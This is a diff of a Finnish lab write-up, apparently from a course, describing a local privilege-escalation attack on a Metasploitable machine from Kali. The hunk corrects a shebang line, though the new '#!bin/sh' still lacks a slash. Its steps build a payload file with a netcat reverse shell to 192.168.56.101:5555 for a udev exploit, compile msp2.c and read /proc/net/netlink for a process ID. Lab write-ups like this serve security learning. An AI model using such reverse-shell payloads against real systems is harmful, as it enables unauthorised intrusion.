@@ -50,7 +50,7 @@ Metasploitablessa daemonina (auki toisella komentorivillä Kalillla):
 - Tarkistin, että tiedosto latautui ``ls``
 - Loin tiedoston run ``touch run``
 -Tarkistin, että tiedosto löytyi ``ls``
-- run-tiedostoon lisäsin koodia ``echo '#½/bin/sh' > run`` ja ``echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run`` (5555 on Kalin portti, jota kautta yhteys otetaan)
+- run-tiedostoon lisäsin koodia ``echo '#!bin/sh' > run`` ja ``echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run`` (5555 on Kalin portti, jota kautta yhteys otetaan)
 - Tarkistin, että tiedostossa luki mitä kirjoitin ``cat run``: tämä tiedosto on payload, joka liitetään udev-exploitiin
 - ``gcc msp2.c -o msp2`` Komennolla käännetään ohjelma ja nimetään se msp2, nyt sen voi suorittaa Linux-ympäristössä
 - ``cat /proc/net/netlink`` sain prosessin Pid: 2406, tätä tarvitsee seuraavaksi
